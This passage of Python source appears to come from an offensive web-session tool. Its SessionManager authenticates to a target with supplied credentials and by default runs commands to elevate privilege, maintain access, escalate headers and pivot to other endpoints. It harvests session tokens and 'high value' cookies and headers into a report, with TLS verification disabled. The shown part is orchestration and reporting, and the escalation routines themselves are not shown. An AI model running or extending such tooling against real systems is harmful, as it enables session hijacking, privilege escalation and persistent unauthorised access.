            state_before=state_before, state_after=self.state,
            privilege_before=priv_before, privilege_after=self.privilege_level,
            actions_taken=["reauth_attempted"],
            new_tokens=[t for t in self.tokens if t.token_type == TokenType.SESSION_COOKIE],
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
            detail=f"auth result: {self.state.name}",
        )

    async def run(self) -> SessionReport:
        self._start_time = time.monotonic()
        connector = TCPConnector(ssl=False, limit=10)
        jar = AiohttpCookieJar()
        self._http = ClientSession(connector=connector, cookie_jar=jar)
        try:
            await self._probe_target()
            if self.identities:
                await self._authenticate()

            for cmd in self.commands:
                if self.state == SessionState.DEAD:
                    break
                result = await self._execute_command(cmd)
                self.command_results.append(result)

            if self.state not in (SessionState.DEAD, SessionState.UNAUTHENTICATED):
                self.snapshots.append(self._snapshot())

        finally:
            await self._http.close()
            self._http = None

        high_val_cookies = [
            c for snap in self.snapshots for c in snap.cookies
            if c.lower() in HIGH_VALUE_COOKIE_NAMES
        ]
        high_val_headers = list({
            k for snap in self.snapshots for k in snap.headers
            if k.lower() in HIGH_VALUE_HEADER_NAMES
        })

        return SessionReport(
            session_id=self.session_id,
            target_url=self.target_url,
            final_state=self.state,
            final_privilege=self.privilege_level,
            identities_used=[i.username for i in self.identities[:self.active_identity_idx + 1]],
            commands_executed=self.command_results,
            request_count=len(self.request_history),
            token_captures=self.tokens,
            snapshots=self.snapshots,
            pivots=self.pivots,
            high_value_cookies=list(set(high_val_cookies)),
            high_value_headers=high_val_headers,
            auth_endpoints_discovered=self.auth_endpoints,
            duration_seconds=round(time.monotonic() - self._start_time, 2),
        )


def serialize_report(report: SessionReport) -> dict:
    def tok(t: CapturedToken) -> dict:
        return {
            "type": t.token_type.value, "value": t.value[:80] + "..." if len(t.value) > 80 else t.value,
            "source": t.source, "header_name": t.header_name, "cookie_name": t.cookie_name,
            "param_name": t.param_name, "expired": t.is_expired(),
        }

    def cmd_result(r: CommandResult) -> dict:
        return {
            "command": r.command.value, "success": r.success,
            "state_before": r.state_before.value, "state_after": r.state_after.value,
            "privilege_before": r.privilege_before.name, "privilege_after": r.privilege_after.name,
            "actions": r.actions_taken, "new_tokens": len(r.new_tokens),
            "duration_ms": r.duration_ms, "detail": r.detail,
        }

    def snap(s: SessionSnapshot) -> dict:
        return {
            "snapshot_id": s.snapshot_id, "state": s.state.value,
            "privilege": s.privilege_level.name,
            "cookies": list(s.cookies.keys()),
            "token_count": len(s.tokens),
            "identity": s.identity.username,
            "created_at": s.created_at,
        }

    return {
        "session_id": report.session_id,
        "target": report.target_url,
        "final_state": report.final_state.value,
        "final_privilege": report.final_privilege.name,
        "identities_used": report.identities_used,
        "request_count": report.request_count,
        "duration_seconds": report.duration_seconds,
        "auth_endpoints_discovered": report.auth_endpoints_discovered,
        "pivots": report.pivots,
        "high_value_cookies": report.high_value_cookies,
        "high_value_headers": report.high_value_headers,
        "token_captures": [tok(t) for t in report.token_captures],
        "commands": [cmd_result(r) for r in report.commands_executed],
        "snapshots": [snap(s) for s in report.snapshots],
    }


def run_session_manager(
    target_url: str,
    credentials: list[dict],
    commands: list[str] = None,
    delay: float = 0.3,
    max_redirects: int = 10,
    timeout: int = 20,
    proxy: Optional[str] = None,
) -> dict:
    if commands is None:
        commands = [
            SessionCommand.ELEVATE_PRIVILEGE.value,
            SessionCommand.MAINTAIN_ACCESS.value,
            SessionCommand.ESCALATE_HEADERS.value,
            SessionCommand.PIVOT_ENDPOINT.value,
        ]
    manager = SessionManager(
        target_url=target_url,
        credentials=credentials,
        commands=commands,
        delay=delay,
        max_redirects=max_redirects,
        timeout=timeout,
        proxy=proxy,
    )
    return serialize_report(asyncio.run(manager.run()))